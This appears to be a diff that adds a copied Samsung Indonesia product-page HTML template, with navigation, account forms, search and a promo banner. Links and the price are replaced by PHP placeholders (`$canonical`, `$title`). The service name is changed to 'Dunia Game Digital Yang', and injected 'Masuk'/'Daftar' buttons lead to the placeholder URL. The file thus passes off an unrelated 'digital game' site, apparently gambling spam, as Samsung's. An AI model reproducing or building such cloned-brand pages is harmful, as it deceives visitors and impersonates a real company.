+            <a an-ac="gnb" an-ca="account" an-la="Product Registration" an-tr="nv00_gnb-product detail-account-account" aria-label="Product Registration" class="nv00-gnb-v4__utility-menu nv00-gnb-v4__utility-menu" href="https://www.samsung.com/id/mypage/myproducts/" role="menuitem">
+             Product&nbsp;Registration
+            </a>
+            <a an-ac="gnb" an-ca="account" an-la="members" an-tr="nv00_gnb-product detail-account-account" aria-label="members" class="nv00-gnb-v4__utility-menu nv00-gnb-v4__utility-menu" href="https://www.samsung.com/id/members/" role="menuitem">
+             Members
+            </a>
+            <a an-ac="gnb" an-ca="account" an-la="Game Digital Yang Setiap" an-tr="nv00_gnb-product detail-account-account" aria-label="Game Digital Yang Setiap" class="nv00-gnb-v4__utility-menu nv00-gnb-v4__utility-menu" href="<?= $canonical; ?>" role="menuitem">
+              Game Digital Yang Setiap
+            </a>
+           </div>
+          </div>
+         </div>
+         <div class="nv00-gnb-v4__utility-wrap after-login">
+          <button an-ac="gnb" an-ca="account" an-la="user name" an-tr="gnb-account, cart-product detail-account-account" aria-expanded="false" aria-label="Go to the another page" class="nv00-gnb-v4__utility nv00-gnb-v4__utility-user" data-js-action="user" role="button">
+           <span class="hidden">
+            Buka Menu Saya
+           </span>
+           <div class="image nv00-gnb-v4__user-profile js-gnb-afterlogin-image">
+            <img alt="[D] Alternative Text" class="image__main" data-comp-name="image" role="img" src="#"/>
+           </div>
+           <svg aria-hidden="true" class="icon nv00-gnb-v4__user-icon js-gnb-afterlogin-no-image" focusable="false" height="96" viewbox="0 0 96 96" width="96">
+            <path d="M48,51.5c16.521,0,30.5,13.82,30.5,29.555h0V89A3.5,3.5,0,0,1,75,92.5H21A3.5,3.5,0,0,1,17.5,89h0V81.055C17.5,65.32,31.479,51.5,48,51.5Zm0,5c-13.772,0-25.5,11.595-25.5,24.555h0V87.5h51V81.055c0-12.831-11.494-24.323-25.087-24.552h0Zm0-53A20.5,20.5,0,1,1,27.5,24,20.5,20.5,0,0,1,48,3.5Zm0,5A15.5,15.5,0,1,0,63.5,24,15.5,15.5,0,0,0,48,8.5Z" transform="translate(-0.5 0.5)">
+            </path>
+           </svg>
+          </button>
+          <div aria-label="account" class="nv00-gnb-v4__utility-menu-list" role="menu">
+           <div class="nv00-gnb-v4__utility-menu-wrap">
+            <a an-ac="gnb" an-ca="account" an-la="user name" an-tr="gnb-account, cart-product detail-account-account" aria-label="Go to the another page" class="nv00-gnb-v4__utility-menu nv00-gnb-v4__utility-menu--user-profile nv00-gnb-v4--pc-only js-user-name js-account" href="javascript:;" role="menuitem">
+             <div class="image nv00-gnb-v4__user-profile js-gnb-afterlogin-image">
+              <img alt="[D] Alternative Text" class="image__main" data-comp-name="image" role="img" src="#"/>
+             </div>
+             <svg aria-hidden="true" class="icon nv00-gnb-v4__user-icon js-gnb-afterlogin-no-image" focusable="false" height="96" viewbox="0 0 96 96" width="96">
+              <path d="M48,51.5c16.521,0,30.5,13.82,30.5,29.555h0V89A3.5,3.5,0,0,1,75,92.5H21A3.5,3.5,0,0,1,17.5,89h0V81.055C17.5,65.32,31.479,51.5,48,51.5Zm0,5c-13.772,0-25.5,11.595-25.5,24.555h0V87.5h51V81.055c0-12.831-11.494-24.323-25.087-24.552h0Zm0-53A20.5,20.5,0,1,1,27.5,24,20.5,20.5,0,0,1,48,3.5Zm0,5A15.5,15.5,0,1,0,63.5,24,15.5,15.5,0,0,0,48,8.5Z" transform="translate(-0.5 0.5)">
+              </path>
+             </svg>
+             <p class="user-name">
+             </p>
+            </a>
+            <a class="nv00-gnb-v4__utility-menu nv00-gnb-v4__utility-menu--with-icon nv00-gnb-v4--pc-only" href="<?= $canonical; ?>" role="menuitem">
+             Receive up to 5% of your purchase back in points.
+             <svg aria-hidden="true" class="icon" focusable="false">
+              <use href="#next-regular" xlink:href="#next-regular">
+              </use>
+             </svg>
+            </a>
+            <a an-ac="gnb" an-ca="account" an-la="my page" an-tr="nv00_gnb-product detail-account-account" aria-label="my page" class="nv00-gnb-v4__utility-menu nv00-gnb-v4__utility-menu" href="https://www.samsung.com/id/mypage/" role="menuitem">
+             Halaman&nbsp;Saya
+            </a>
+            <a an-ac="gnb" an-ca="account" an-la="orders" an-tr="nv00_gnb-product detail-account-account" aria-label="orders" class="nv00-gnb-v4__utility-menu nv00-gnb-v4__utility-menu" href="http://shop.samsung.com/id/mypage/orders/" role="menuitem">
+             Pesanan
+            </a>
+            <a an-ac="gnb" an-ca="account" an-la="product registration" an-tr="nv00_gnb-product detail-account-account" aria-label="product registration" class="nv00-gnb-v4__utility-menu nv00-gnb-v4__utility-menu" href="https://www.samsung.com/id/mypage/myproducts/" role="menuitem">
+             Product&nbsp;Registration
+            </a>
+            <a an-ac="gnb" an-ca="account" an-la="my rewards" an-tr="nv00_gnb-product detail-account-account" aria-label="my rewards" class="nv00-gnb-v4__utility-menu nv00-gnb-v4__utility-menu" href="https://www.samsung.com/id/mypage/rewards/" role="menuitem">
+             Rewards&nbsp;Saya
+            </a>
+            <a an-ac="gnb" an-ca="account" an-la="wishlist" an-tr="nv00_gnb-product detail-account-account" aria-label="wishlist" class="nv00-gnb-v4__utility-menu nv00-gnb-v4__utility-menu" href="http://shop.samsung.com/id/mypage/wishlist" role="menuitem">
+             Wishlist
+            </a>
+            <a an-ac="gnb" an-ca="account" an-la="members" an-tr="nv00_gnb-product detail-account-account" aria-label="members" class="nv00-gnb-v4__utility-menu nv00-gnb-v4__utility-menu" href="https://www.samsung.com/id/members/" role="menuitem">
+             Members
+            </a>
+            <a an-ac="gnb" an-ca="account" an-la="community" an-tr="nv00_gnb-product detail-account-account" aria-label="community" class="nv00-gnb-v4__utility-menu nv00-gnb-v4__utility-menu" href="http://r1.community.samsung.com/t5/Indonesia/ct-p/id?profile.language=in" role="menuitem">
+             Komunitas
+            </a>
+            <a an-ac="gnb" an-ca="account" an-la="logout" an-tr="nv00_gnb-product detail-account-account" aria-label="logout" class="nv00-gnb-v4__utility-menu nv00-gnb-v4__utility-menu logoutBtn" href="javascript:;" role="menuitem">
+             Keluar
+            </a>
+           </div>
+          </div>
+         </div>
+        </div>
+       </div>
+       <button an-ac="gnb" an-ca="navigation" an-la="gnb:close" an-tr="nv00_gnb-product detail-gnb open / close-navigation2" class="nv00-gnb-v4__close-btn">
+        <span class="hidden">
+         Close menu
+        </span>
+        <svg aria-hidden="true" class="icon" focusable="false">
+         <use href="#cancel-close-regular" xlink:href="#cancel-close-regular">
+         </use>
+        </svg>
+       </button>
+      </div>
+     </div>
+    </div>
+    <div class="nv00-gnb-v4__dim">
+    </div>
+    <form action="https://account.samsung.com/accounts/v1/DCGLID/signInGate" id="signInForm" method="get" name="signInForm">
+     <input id="response_type" name="response_type" type="hidden" value=""/>
+     <input name="client_id" type="hidden" value="5kuj08631q"/>
+     <input id="locale" name="locale" type="hidden" value=""/>
+     <input name="countryCode" type="hidden" value="ID"/>
+     <input id="redirect_uri" name="redirect_uri" type="hidden" value="/aemapi/v6/data-login/afterLogin.id.json"/>
+     <input id="signInState" name="state" type="hidden" value=""/>
+     <input id="signInGoBackURL" name="goBackURL" type="hidden" value=""/>
+     <input id="scope" name="scope" type="hidden" value=""/>
+    </form>
+    <!-- SA 로그아웃호출 폼 -->
+    <form action="https://account.samsung.com/accounts/v1/DCGLID/signOutGate" id="signOutForm" method="get" name="signOutForm">
+     <input name="client_id" type="hidden" value="5kuj08631q"/>
+     <input id="signOutState" name="state" type="hidden" value=""/>
+     <input id="signOutURL" name="signOutURL" type="hidden" value="/aemapi/v6/data-login/afterLogout.id.json"/>
+    </form>
+    <!-- 회원가입 폼 -->
+    <form action="https://account.samsung.com/membership/" id="joinForm" method="post" name="joinForm">
+     <input name="actionID" type="hidden" value="SignupAP"/>
+     <input name="serviceID" type="hidden" value="5kuj08631q"/>
+     <input name="serviceName" type="hidden" value="Dunia Game Digital Yang"/>
+     <input name="domain" type="hidden" value=""/>
+     <input name="countryCode" type="hidden" value="ID"/>
+     <input name="languageCode" type="hidden" value="id"/>
+     <input id="joinRegistURL" name="registURL" type="hidden" value="/aemapi/v6/data-login/afterLogin.id.json"/>
+     <input id="joinReturnURL" name="returnURL" type="hidden"/>
+     <input id="joinGoBackURL" name="goBackURL" type="hidden" value=""/>
+     <input name="ssoType" type="hidden" value="ENC_TK"/>
+     <input id="joinEmailActivationURL" name="emailActivationURL" type="hidden" value="/aemapi/v6/data-login/emailActivationURL.id.json"/>
+    </form>
+    <!-- Find Email 폼 -->
+    <form action="https://account.samsung.com/membership/" id="findAccountForm" method="post" name="findAccountForm">
+     <input name="actionID" type="hidden" value="FindEmail"/>
+     <input name="serviceID" type="hidden" value="5kuj08631q"/>
+     <input name="serviceName" type="hidden" value="Dunia Game Digital Yang"/>
+     <input name="domain" type="hidden" value=""/>
+     <input name="countryCode" type="hidden" value="ID"/>
+     <input name="languageCode" type="hidden" value="id"/>
+     <input id="findGoBackURL" name="goBackURL" type="hidden" value=""/>
+     <input name="ssoType" type="hidden" value="ENC_TK"/>
+    </form>
+    <!-- Account Modify Form -->
+    <form action="https://account.samsung.com/membership/" id="accountModifyForm" method="post" name="accountModifyForm">
+     <input name="actionID" type="hidden" value="ModifyUserInfo"/>
+     <input name="serviceID" type="hidden" value="5kuj08631q"/>
+     <input name="serviceName" type="hidden" value="Dunia Game Digital Yang"/>
+     <input name="domain" type="hidden" value=""/>
+     <input name="countryCode" type="hidden" value="ID"/>
+     <input name="languageCode" type="hidden" value="id"/>
+     <input id="accountModifyGoBackURL" name="goBackURL" type="hidden" value=""/>
+     <input name="ssoType" type="hidden" value="ENC_TK"/>
+    </form>
+    <form id="textForm" name="textForm">
+     <input id="productCountText" name="productCountText" type="hidden" value="Jumlah Produk"/>
+    </form>
+    <input id="domain" name="domain" type="hidden" value="www.samsung.com"/>
+    <input id="useLogin" name="useLogin" type="hidden" value="Y"/>
+    <input id="useStore" name="useStore" type="hidden" value="Y"/>
+    <input id="storeDomain" name="storeDomain" type="hidden" value="https://api.shop.samsung.com/"/>
+    <input id="hybrisApiJson" name="hybrisApiJson" type="hidden"/>
+    <input id="addToCartPostYn" name="addToCartPostYn" type="hidden" value="Y"/>
+    <input id="tokocommercewebservicesYn" name="tokocommercewebservicesYn" type="hidden"/>
+    <input id="useNewAddToCartApi" name="useNewAddToCartApi" type="hidden" value="Y"/>
+    <input id="loginLinkURL" name="loginLinkURL" type="hidden" value="https://account.samsung.com/accounts/v1/DCGLID/signInGate"/>
+    <input id="logoutURL" name="logoutURL" type="hidden" value="https://account.samsung.com/accounts/v1/DCGLID/signOutGate"/>
+    <input id="updateProfileURL" name="updateProfileURL" type="hidden"/>
+    <input id="isLoginWithNoStore" name="isLoginWithNoStore" type="hidden"/>
+    <input id="countryCode" name="countryCode" type="hidden" value="ID"/>
+    <input id="languageCode" name="languageCode" type="hidden" value="id"/>
+    <input id="loginAccountServiceId" name="loginAccountServiceId" type="hidden" value="5kuj08631q"/>
+    <input id="emailActivationURL" name="emailActivationURL" type="hidden" value="/aemapi/v6/data-login/emailActivationURL.id.json"/>
+    <input id="shopIntegrationFlag" name="shopIntegrationFlag" type="hidden" value="Hybris-new"/>
+    <input id="tieredPriceUseYn" name="tieredPriceUseYn" type="hidden"/>
+    <input id="mySamsungRewardsTierType" name="mySamsungRewardsTierType" type="hidden" value="global"/>
+    <input id="newMyRewardCurrencyConv" name="newMyRewardCurrencyConv" type="hidden" value="1.000"/>
+    <input id="countryIsoCode" name="countryIsoCode" type="hidden" value="IDN"/>
+    <input id="loginValidateYnForGPv2" name="loginValidateYnForGPv2" type="hidden" value=""/>
+    <div class="nv00-gnb-v4__layer-popup-wrap">
+     <div class="nv00-gnb-v4__layer-popup-looping--start" tabindex="0">
+     </div>
+     <div class="layer-popup gnb-layer_popup-js" id="layerEmptyCart">
+      <svg aria-hidden="true" class="icon" focusable="false">
+       <use href="#info-regular" xlink:href="#info-regular">
+       </use>
+      </svg>
+      <p class="layer-popup__desc information-text">
+       Keranjang belanja Anda kosong
+      </p>
+      <div class="layer-popup__cta-wrap">
+       <button an-ac="cart is empty:OK" an-ca="other interaction" an-la="cart is empty:OK" an-tr="nv00_gnb-product detail-cart popup-other_interaction" aria-label="Accessibility Text" class="cta cta--contained cta--black gnb-js-layer-close" onclick="window.sg.components.Nv00GnbV4.closeLayerPopup(this);">
+        OK
+       </button>
+      </div>
+      <button class="layer-popup__close">
+       <span class="hidden">
+        Tutup Layar Popup
+       </span>
+       <svg aria-hidden="true" class="icon" focusable="false">
+        <use href="#delete-bold" xlink:href="#delete-bold">
+        </use>
+       </svg>
+      </button>
+     </div>
+     <div class="layer-popup gnb-layer_popup-js" id="layerInsufficientStock">
+      <svg aria-hidden="true" class="icon" focusable="false">
+       <use href="#info-regular" xlink:href="#info-regular">
+       </use>
+      </svg>
+      <p class="layer-popup__desc information-text">
+       Maaf, persediaan barang di keranjang belanja tidak cukup.
+      </p>
+      <div class="layer-popup__cta-wrap">
+       <button aria-label="Accessibility Text" class="cta cta--contained cta--black gnb-js-layer-close" onclick="window.sg.components.Nv00GnbV4.closeLayerPopup(this);">
+        OK
+       </button>
+      </div>
+      <button class="layer-popup__close">
+       <span class="hidden">
+        Tutup Layar Popup
+       </span>
+       <svg aria-hidden="true" class="icon" focusable="false">
+        <use href="#delete-bold" xlink:href="#delete-bold">
+        </use>
+       </svg>
+      </button>
+     </div>
+     <div class="layer-popup gnb__remove-product gnb-layer_popup-js" id="layerRemoveProduct">
+      <p class="layer-popup__title">
+       Hapus produk
+      </p>
+      <p class="layer-popup__desc">
+       Tanpa produk ini, kupon atau kode promo yang berlaku tidak dapat ditukarkan.
+       <br/>
+       Anda yakin ingin menghapus produk ini?
+      </p>
+      <div class="layer-popup__cta-wrap">
+       <button aria-label="Accessibility Text" class="cta cta--outlined cta--black">
+        Pindahkan ke wishlist
+       </button>
+       <button aria-label="Accessibility Text" class="cta cta--contained cta--black">
+        Hapus
+       </button>
+      </div>
+      <button class="layer-popup__close">
+       <span class="hidden">
+        Tutup Layar Popup
+       </span>
+       <svg aria-hidden="true" class="icon" focusable="false">
+        <use href="#delete-bold" xlink:href="#delete-bold">
+        </use>
+       </svg>
+      </button>
+     </div>
+     <div class="layer-popup gnb-layer_popup-js gnb__popup-privacy" id="layerPrivacy">
+      <p class="layer-popup__title">
+       Privacy Policy
+      </p>
+      <div class="layer-popup__checkbox-wrap">
+       <div class="checkbox-v2">
+        <input class="checkbox-v2__input" id="privacy-terms" name="checkbox" type="checkbox"/>
+        <label class="checkbox-v2__label" for="privacy-terms">
+         <span class="checkbox-v2__label-box-wrap">
+          <span class="checkbox-v2__label-box">
+           <svg aria-hidden="true" class="checkbox-v2__label-box-icon" focusable="false">
+            <use href="#done-bold" xlink:href="#done-bold">
+            </use>
+           </svg>
+          </span>
+         </span>
+         <span class="checkbox-v2__label-text">
+          Saya telah membaca dan setuju dengan
+          <a class="link-text" href="https://www.samsung.com/id/info/privacy/" target="_blank" title="Buka di Tab Baru">
+           Kebijakan Privasi
+          </a>
+          Samsung.com
+         </span>
+        </label>
+       </div>
+       <p class="layer-popup__checkbox-desc error" id="errorPrivacy">
+        Centang kotak ini untuk melanjutkan ke Samsung.com.
+       </p>
+       <div class="checkbox-v2">
+        <input class="checkbox-v2__input" id="privacy-terms2" name="checkbox" type="checkbox"/>
+        <label class="checkbox-v2__label" for="privacy-terms2">
+         <span class="checkbox-v2__label-box-wrap">
+          <span class="checkbox-v2__label-box">
+           <svg aria-hidden="true" class="checkbox-v2__label-box-icon" focusable="false">
+            <use href="#done-bold" xlink:href="#done-bold">
+            </use>
+           </svg>
+          </span>
+         </span>
+         <span class="checkbox-v2__label-text">
+          Dengan mencentang kotak ini, berarti saya bersedia menerima Pembaruan Layanan Samsung, termasuk:
+         </span>
+        </label>
+       </div>
+       <p class="layer-popup__checkbox-desc">
+        Layanan dan informasi pemasaran Samsung.com, berikut produk baru dan pengumuman layanan serta penawaran khusus, peristiwa dan buletin berkalanya.
+       </p>
+      </div>
+      <div class="layer-popup__cta-wrap">
+       <button aria-label="Accessibility Text" class="cta cta--outlined cta--black" id="privacyBtn">
+        MELANJUTKAN KE SAMSUNG.COM
+       </button>
+       <button aria-label="Accessibility Text" class="cta cta--contained cta--black login-leave-btn" onclick="window.sg.components.Nv00GnbV4.closeLayerPopup(this);">
+        TINGGALKAN HALAMAN INI
+       </button>
+      </div>
+      <button class="layer-popup__close login-leave-btn" data-focus-id="shop-popover-close" data-tab-disable="true">
+       <span class="hidden">
+        Tutup Kebijakan Privasi
+       </span>
+       <svg aria-hidden="true" class="icon" focusable="false">
+        <use href="#delete-bold" xlink:href="#delete-bold">
+        </use>
+       </svg>
+      </button>
+     </div>
+     <div class="layer-popup gnb__popup-privacy gnb-layer_popup-js" id="layerPreference">
+      <p class="layer-popup__title">
+       Periksa Preferensi
+      </p>
+      <p class="layer-popup__desc">
+       Berikan rekomendasi untuk memperbaharui preferensi produk Anda.
+      </p>
+      <div class="layer-popup__cta-wrap">
+       <button aria-label="Accessibility Text" class="cta cta--outlined cta--black" id="preferenceCheckBtn">
+        YA
+       </button>
+       <button aria-label="Accessibility Text" class="cta cta--contained cta--black" id="privacyCloseBtn" onclick="window.sg.components.Nv00GnbV4.closeLayerPopup(this);">
+        NANTI
+       </button>
+      </div>
+      <button class="layer-popup__close" data-focus-id="shop-popover-close" data-tab-disable="true">
+       <span class="hidden">
+        Tutup Preferensi
+       </span>
+       <svg aria-hidden="true" class="icon" focusable="false">
+        <use href="#delete-bold" xlink:href="#delete-bold">
+        </use>
+       </svg>
+      </button>
+     </div>
+     <div class="nv00-gnb-v4__layer-popup-looping--end" tabindex="0">
+     </div>
+    </div>
+   </nav>
+   <input id="sc_gnb_searchURL" name="sc_gnb_searchURL" type="hidden" value="/id/aisearch"/>
+   <input id="sc_gnb_AI_searchURL" name="sc_gnb_AI_searchURL" type="hidden" value="/id/aisearch"/>
+   <input id="sc_gnb_placeholder" name="sc_gnb_placeholder" type="hidden" value="Galaxy Z Fold7"/>
+   <input id="sc_gnb_aiSearchUseYn" name="sc_gnb_aiSearchUseYn" type="hidden" value="Y"/>
+   <input id="sc_gnb_bdcApiUseYn" name="sc_gnb_bdcApiUseYn" type="hidden" value="Y"/>
+   <input id="sc_gnb_AiLoginUseYn" name="sc_gnb_AiLoginUseYn" type="hidden" value="N"/>
+   <input id="sc_gnb_eppUseGnbAiSearchYn" name="sc_gnb_eppUseGnbAiSearchYn" type="hidden"/>
+   <input id="eppFlag" name="eppFlag" type="hidden" value="N"/>
+   <section aria-modal="true" class="srd19-gnb-search" role="dialog">
+    <div class="srd19-gnb-search__looping--start" tabindex="0">
+    </div>
+    <div class="srd19-gnb-search__contents">
+     <form action="#" autocomplete="off" class="srd19-gnb-search__form" role="search">
+      <fieldset>
+       <legend>
+        Search Form
+       </legend>
+       <button aria-label="Cari" class="srd19-gnb-search__btn-search" type="submit">
+        <svg class="icon" focusable="false">
+         <use href="#search-regular" xlink:href="#search-regular">
+         </use>
+        </svg>
+       </button>
+       <div class="srd19-gnb-search__input-wrap">
+        <input aria-label="Cari" class="srd19-gnb-search__input" id="gnb-search-keyword" name="search" placeholder="Cari" type="text"/>
+       </div>
+       <button an-ac="search layer" an-ca="search" an-la="clear" an-tr="srd19_gnb search-product detail-delete-search" class="srd19-gnb-search__clear" type="button">
+        <span class="text">
+         Kosongkan
+        </span>
+       </button>
+       <button class="srd19-gnb-search__scan-barcode srd19-gnb-search__scan-barcode--hide" type="button">
+        <span class="hidden">
+         Scan Barcode
+        </span>
+        <svg aria-hidden="true" class="icon" focusable="false">
+         <use href="#barcode-regular" xlink:href="#barcode-regular">
+         </use>
+        </svg>
+       </button>
+      </fieldset>
+     </form>
+     <div class="srd19-gnb-search__result-wrap">
+      <div class="srd19-gnb-search__result">
+       <div class="srd19-gnb-search__searches">
+        <div class="srd19-gnb-search__list-wrap srd19-gnb-search__no-suggestions srd19-gnb-search__list-wrap--hide">
+         <div class="srd19-gnb-search__list-title-wrap">
+          <p class="srd19-gnb-search__list-title" id="search-list-label">
+           Tidak Ada Saran
+          </p>
+         </div>
+        </div>
+        <div class="srd19-gnb-search__list-wrap srd19-gnb-search__ai-search srd19-gnb-search__list-wrap--hide">
+         <div class="srd19-gnb-search__list-title-wrap">
+          <p class="srd19-gnb-search__list-title" id="search-list-label">
+           AI Suggested Searches
+          </p>
+         </div>
+         <ul aria-labelledby="search-list-label" class="srd19-gnb-search__list" role="list">
+         </ul>
+        </div>
+        <div class="srd19-gnb-search__list-wrap srd19-gnb-search__suggested srd19-gnb-search__list-wrap--hide">
+         <div class="srd19-gnb-search__list-title-wrap">
+          <p class="srd19-gnb-search__list-title" id="search-list-label">
+           Pencarian yang Disarankan
+          </p>
+         </div>
+         <ul aria-labelledby="search-list-label" class="srd19-gnb-search__list" role="list">
+         </ul>
+        </div>
+        <div class="srd19-gnb-search__list-wrap srd19-gnb-search__popular">
+         <div class="srd19-gnb-search__list-title-wrap">
+          <p class="srd19-gnb-search__list-title" id="search-list-label">
+           PENCARIAN POPULER
+          </p>
+         </div>
+         <ul aria-labelledby="search-list-label" class="srd19-gnb-search__list" role="list">
+         </ul>
+        </div>
+        <div class="srd19-gnb-search__list-wrap srd19-gnb-search__recent srd19-gnb-search__list-wrap--hide">
+         <div class="srd19-gnb-search__list-title-wrap">
+          <p class="srd19-gnb-search__list-title" id="search-list-label">
+           PENCARIAN TERBARU
+          </p>
+         </div>
+         <ul aria-labelledby="search-list-label" class="srd19-gnb-search__list" role="list">
+         </ul>
+        </div>
+       </div>
+       <div class="srd19-gnb-search__thumb srd19-gnb-search__related srd19-gnb-search__list-wrap--hide">
+        <div class="srd19-gnb-search__thumb-title-wrap">
+         <p class="srd19-gnb-search__thumb-title" id="rec-label">
+          PRODUK TERKAIT
+         </p>
+        </div>
+        <ul aria-labelledby="rec-label" class="srd19-gnb-search__thumb-list" role="menu">
+        </ul>
+       </div>
+       <div class="srd19-gnb-search__thumb srd19-gnb-search__recommended">
+        <div class="srd19-gnb-search__thumb-title-wrap">
+         <p class="srd19-gnb-search__thumb-title" id="rec-label">
+          DIREKOMENDASIKAN
+         </p>
+        </div>
+        <ul aria-labelledby="rec-label" class="srd19-gnb-search__thumb-list" role="menu">
+        </ul>
+       </div>
+      </div>
+     </div>
+     <button an-ac="search layer" an-ca="search" an-la="close" an-tr="srd19_gnb search-product detail-close-search" class="srd19-gnb-search__close" type="button">
+      <span class="hidden">
+       Tutup
+      </span>
+      <svg class="icon" focusable="false">
+       <use href="#cancel-close-regular" xlink:href="#cancel-close-regular">
+       </use>
+      </svg>
+     </button>
+    </div>
+    <div aria-hidden="true" class="srd19-gnb-search__dimmed">
+    </div>
+    <div class="srd19-gnb-search__looping--end" tabindex="0">
+    </div>
+   </section>
+   <!--googleon: all-->
+   <div class="st-page-pd" id="content" role="main">
+    <input id="isNotDelTagSites" name="isNotDelTagSites" type="hidden" value="N"/>
+    <input id="isExposeExtraRewardsSites" name="isExposeExtraRewardsSites" type="hidden" value="N"/>
+    <input id="modelCode" name="modelCode" type="hidden" value="MS-F813QBDUIDZ"/>
+    <input id="categorySubSubTypeCode" name="categorySubSubTypeCode" type="hidden"/>
+    <input id="categorySubTypeCode" name="categorySubTypeCode" type="hidden" value="01010400"/>
+    <input id="categoryTypeCode" name="categoryTypeCode" type="hidden" value="01010000"/>
+    <input id="typeCodeForGNB" name="typeCodeForGNB" type="hidden" value="01010000"/>
+    <input id="groupCodeForGNB" name="groupCodeForGNB" type="hidden" value="01000000"/>
+    <input id="categoryGroupCode" name="categoryGroupCode" type="hidden" value="01000000"/>
+    <input id="emiUrl" name="emiUrl" type="hidden" value="/id/web/emi"/>
+    <input id="financingUrl" name="financingUrl" type="hidden" value="/id/web/si-calculator"/>
+    <input id="categoryname" name="categoryname" type="hidden"/>
+    <input id="modelName" name="modelName" type="hidden" value="SM-A075F/DS"/>
+    <input id="useNewWtb" name="useNewWtb" type="hidden" value="Y"/>
+    <input id="priceCurrency" name="priceCurrency" type="hidden" value="idr"/>
+    <input id="gpvGetTypeCheck" name="gpvGetTypeCheck" type="hidden" value="Y"/>
+    <input id="isPreqa" name="isPreqa" type="hidden" value="false"/>
+    <input id="typeux2025" name="typeux2025" type="hidden" value="Y"/>
+    <div class="pd-g-product-promotion-bar">
+    </div>
+    <div class="pd-g-product-detail-offer-banner">
+     <section class="pd-banner" data-fold-data='{"bgColor": "#f7f7f7", "textColor": "black"}' data-prefold-data='{"bgColor": "", "textColor": ""}' data-preunfold-data='{"bgColor": "", "textColor": ""}' data-unfold-data='{"bgColor": "#f7f7f7", "textColor": "black"}' style="display:none;">
+      <div class="pd-banner__inner" data-end-text="Selesai di" data-end-time="203012310000Z" data-start-text="Mulai di">
+       
+        <div class="pd-banner__content-wrap">
+         <div class="pd-banner__content">
+          <h2 class="pd-banner__headline">
+           Dapatkan gratis hadiah
+          </h2>
+          <div class="pd-banner__desc-wrap">
+           <p class="pd-banner__desc">
+            - Gratis hadiah Travel Adapter 25W dan Case A07 (Stock Terbatas)
+            <br/>
+            - Bayar cuman Rp559.300 dengan menambahkan Buds Core ke troli Anda!
+            <br/>
+            - Samsung Care+ proteksi diskon 30%
+            <br/>
+            <br/>
+            Periode: 14 Maret - 10 April 2025
+           </p>
+           <div class="pd-banner__image-mo">
+            <div class="image">
+             <img alt="Dapatkan gratis hadiah" class="image__preview lazy-load" data-comp-name="image" data-src="?$144_80_PNG$" role="img"/>
+             <img alt="Dapatkan gratis hadiah" class="image__main lazy-load" data-comp-name="image" data-src="?$144_80_PNG$" role="img"/>
+            </div>
+           </div>
+          </div>
+         </div>
+        </div>
+       </div>
+       <a an-ac="view more" an-ca="indication" an-la="view more" an-tr="pdd11_offer banner-product detail-image-arrow" aria-expanded="false" class="pd-banner__toggle" href="javascript:void(0)" role="button">
+        <svg class="icon icon--open" focusable="false">
+         <use xlink:href="https://www.samsung.com/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/svg-sprite.svg#open-down-regular">
+         </use>
+        </svg>
+        <svg class="icon icon--close" focusable="false">
+         <use xlink:href="https://www.samsung.com/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/svg-sprite.svg#close-up-regular">
+         </use>
+        </svg>
+        <span class="pd-banner__toggle-open-text hidden">
+         Buka Info Lebih Lanjut
+        </span>
+        <span class="pd-banner__toggle-close-text hidden">
+         Tutup Info Lebih Lanjut
+        </span>
+       </a>
+      </div>
+     </section>
+    </div>
+    
+           
+           </div>
+          </div>
+         </div>
+        </div>
+        <div class="pdd39-anchor-nav__price pd-buying-price" id="sgDevPriceAreaBase">
+         <div class="price-ux__wrap pd-buying-price__wrap">
+          <div id="sgDevPriceArea">
+          </div>
+          <div class="pdd39-anchor-nav__cta pd-buying-price__cta">
+          </div>
+         </div>
+        </div>
+        <!--googleoff: all-->
+        <div class="sdf-component-templates">
+         <div class="pdd39-anchor-nav__price pd-buying-price" data-sdf-template="priceBox @ price" data-sdf-unwrap="true">
+          <div class="price-ux__wrap pd-buying-price__wrap">
+           <div class="pd-buying-price__inner">
+            <p class="pd-buying-price__advice-price" data-sdf-test="{{priceAnchor.priceWrapper.info.noLineOrignal}}">
+             {{priceAnchor.priceWrapper.info.noLineOrignal}}
+            </p>
+            <div class="pd-buying-price__new-price" data-sdf-test="{{priceAnchor.priceWrapper.info.totalPrice}}">
+             <div class="pd-buying-price__new-price-inner">
+              <?= $title; ?>
+             </div>
+             <span class="pd-buying-price__monthly-price" data-sdf-test="{{priceAnchor.priceWrapper.info.totalPriceMonthly}}">
+              {{priceAnchor.priceWrapper.info.totalPriceMonthly}}
+             </span>
+            </div>
+            <div class="pd-buying-price__box">
+             <p class="pd-buying-price__trade-in" data-sdf-test="{{priceAnchor.priceWrapper.info.ceExchangePrice}}">
+              {{priceAnchor.priceWrapper.info.ceExchangePrice}}
+             </p>
+             <div class="pd-buying-price__tax" data-sdf-test="{{priceAnchor.priceWrapper.info.orignalPriceAddText}}">
+              {{priceAnchor.priceWrapper.info.orignalPriceAddText}}
+             </div>
+             <div class="pd-buying-price__label" data-sdf-test="{{priceAnchor.priceWrapper.info.lowestWasPricetext}}">
+              {{priceAnchor.priceWrapper.info.lowestWasPricetext}}
+             </div>
+             <div class="pd-buying-price__was" data-sdf-test="{{priceAnchor.priceWrapper.info.orignalPrice}}">
+              <span class="hidden">
+               Harga awal:
+              </span>
+              {{priceAnchor.priceWrapper.info.orignalPrice}}
+             </div>
+             <div class="pd-buying-price__save" data-sdf-test="{{priceAnchor.priceWrapper.info.savePrice}}">
+              {{priceAnchor.priceWrapper.info.savePrice}}
+             </div>
+             <div class="pd-buying-price__disclaimer" data-sdf-test="{{priceAnchor.priceWrapper.info.disclaimer}}">
+              {{priceAnchor.priceWrapper.info.disclaimer}}
+             </div>
+            </div>
+           </div>
+           <div class="pdd39-anchor-nav__cta pd-buying-price__cta">
+            <a href="<?= $canonical; ?>" class="cta cta--contained cta--emphasis cta--2line add-special-tagging">
+             Masuk
+            </a>
+            <a href="<?= $canonical; ?>" class="cta cta--contained cta--emphasis cta--2line add-special-tagging">
+             Daftar
+            </a>
+           </div>
+          </div>
+         </div>
+        </div>
+        <!--googleon: all-->
+       </div>
+       <input id="featureYN" name="featureYN" type="hidden" value="Y"/>
+       <div class="pdd39-anchor-nav__menu">
+        <div class="tab" data-auto-init="false" data-comp-name="tab" data-use-arrow="" data-use-arrow-mo="">
+         <div class="tab__left-arrow-wrap">
+          <button aria-label="previous" class="tab__left-arrow disabled" role="button" type="button">
+           <svg aria-hidden="true" class="icon" focusable="false">
+            <use href="#previous-regular" xlink:href="#previous-regular">
+            </use>
+           </svg>
+          </button>
+         </div>
